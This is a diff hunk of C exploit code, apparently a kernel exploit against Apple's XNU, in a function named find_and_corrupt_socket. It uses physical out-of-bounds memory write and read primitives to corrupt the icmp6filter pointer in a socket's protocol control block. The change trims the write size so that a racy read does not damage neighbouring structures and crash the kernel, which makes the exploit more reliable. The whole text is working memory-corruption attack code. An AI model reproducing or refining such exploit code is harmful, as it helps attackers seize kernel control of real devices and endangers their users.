@@ -693,8 +693,14 @@ int find_and_corrupt_socket(mach_port_t memoryObject, mach_vm_offset_t seekingOf
 		*(uint64_t *)((uintptr_t)writeBuffer + pcbStartOffset + OFFSET_ICMP6FILT + 8) = 0;
 
 		printf("[+] Corrupting icmp6filter pointer...\n");
+		// write only enough to cover target PCB — the OOB read is non-atomic
+		// (race captures a mix of randomMarker and real data), so collateral PCBs
+		// in the writeBuffer may contain randomMarker at their icmp6filt offset.
+		// writing those back corrupts their filter pointers → zone_require panic.
+		mach_vm_size_t writeSize = pcbStartOffset + OFFSET_ICMP6FILT + 0x10;
+		if (writeSize > OOB_SIZE) writeSize = OOB_SIZE;
 		while (true) {
-			physical_oob_write_mo(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, writeBuffer);
+			physical_oob_write_mo(memoryObject, seekingOffset, writeSize, OOB_OFFSET, writeBuffer);
 			physical_oob_read_mo_with_retry(memoryObject, seekingOffset, OOB_SIZE, OOB_OFFSET, readBuffer);
 			uint64_t newIcmp6Filter = *(uint64_t *)((uintptr_t)readBuffer + pcbStartOffset + OFFSET_ICMP6FILT);
 			if (newIcmp6Filter == inpListNextPointer + OFFSET_ICMP6FILT) {
